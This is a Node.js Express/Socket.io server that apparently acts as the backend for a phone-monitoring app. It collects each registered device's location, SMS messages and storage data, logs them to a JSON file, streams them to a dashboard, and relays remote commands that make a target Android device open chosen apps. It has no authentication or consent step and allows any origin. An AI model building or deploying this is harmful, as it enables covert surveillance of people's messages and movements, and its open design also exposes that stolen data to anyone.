const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const PORT = 3000;
const DATA_FILE = 'data.json';

// Ensure data.json exists and is valid JSON
if (!fs.existsSync(DATA_FILE) || fs.readFileSync(DATA_FILE).length === 0) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({}));
}

const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

const deviceSockets = {}; 

io.on('connection', (socket) => {
    console.log('⚡ Client connected:', socket.id);

    socket.on('register', (deviceId) => {
        if (!deviceSockets[deviceId]) deviceSockets[deviceId] = new Set();
        deviceSockets[deviceId].add(socket.id);
        console.log(`📱 Registered: ${deviceId}`);
    });

    socket.on('data', (data) => {
        const { deviceId, location, sms, storage } = data;
        if (!deviceId) return;

        try {
            let allData = {};
            const fileContent = fs.readFileSync(DATA_FILE, 'utf8');
            if (fileContent) allData = JSON.parse(fileContent);

            const entry = { 
                timestamp: new Date().toISOString(), 
                location: location || { lat: 0, lon: 0 }, 
                sms: sms || [], 
                storage: storage || { total: 0, free: 0 } 
            };

            if (!allData[deviceId]) allData[deviceId] = [];
            allData[deviceId].push(entry);
            
            // Limit history to 50 items to prevent file bloat
            if (allData[deviceId].length > 50) allData[deviceId].shift();
            
            fs.writeFileSync(DATA_FILE, JSON.stringify(allData, null, 2));
            
            // This sends the data to your React Dashboard
            io.emit('dataUpdate', { deviceId, ...entry });
            console.log(`📍 Signal from ${deviceId}`);
        } catch (e) { 
            console.error("Backend Error processing data:", e.message); 
        }
    });
// Look for this section in your backend server.js
    socket.on('command', (data) => {

        const { deviceId, command, packageName } = data;
        console.log(`Relaying command ${command} to device ${deviceId}`);

  // This sends the command to the specific mobile device
  // We include packageName so the Android app knows WHAT to open
        io.to(deviceId).emit('executeCommand', { 
        action: command, 
        targetApp: packageName 
    });
});    

    

    socket.on('disconnect', () => {
        for (const id in deviceSockets) deviceSockets[id].delete(socket.id);
    });
});

// Fix for "Cannot GET /" - Provides a status message if you visit the URL
app.get('/', (req, res) => {
    res.send('✅ Backend Server is Running. Dashboard should be viewed on port 3001 or your React port.');
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server listening on Port ${PORT}`);
});